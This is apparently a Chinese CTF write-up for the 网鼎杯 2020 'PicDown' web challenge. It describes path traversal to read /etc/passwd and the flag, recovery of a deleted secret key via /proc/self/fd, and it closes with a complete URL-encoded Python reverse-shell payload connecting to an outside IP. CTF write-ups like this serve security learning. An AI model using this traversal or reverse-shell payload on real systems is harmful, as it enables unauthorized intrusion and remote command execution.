---
title: '[网鼎杯 2020 白虎组]PicDown'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-09-13 19:36:40
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/68569469.jpg
---

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/122.png)

首先试了一下ssrf但是并没有反应。
后面发现../etc/passwd 可读

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/130.png)

1、非预期

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/133.png)

../flag直接出flag。

2、正常操作
参考
http://www.xianxianlabs.com/blog/2020/06/05/381.html
https://blog.csdn.net/weixin_43610673/article/details/106196856
使用../proc/self/cmdline文件查看当前进行进程执行命令

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/141.png)

访问app.py

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/64562.jpg)

关键代码

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/147.png)

这里的SECRET_KEY是通过
SECRET_FILE = "/tmp/secret.txt"
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)

这里读出来的，尝试读取这个/tmp/secret.txt文件，发现不能读取成功，因为利用 os.remove(SECRET_FILE)）删除。
但是，在 linux 系统中如果一个程序打开了一个文件没有关闭，即便从外部删除之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的 fd，通过这个我们即可得到被删除文件的内容。
尝试之后，在/proc/self/fd/3这里读取到SECRET_FILE

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/848358.jpg)

然后进行python反弹shell

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/53461.jpg)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200913194437.png)

python弹shell，其实网上都有现成的，但还是记录一下：
shell=python%20-c%20%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.0.233.124%22,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
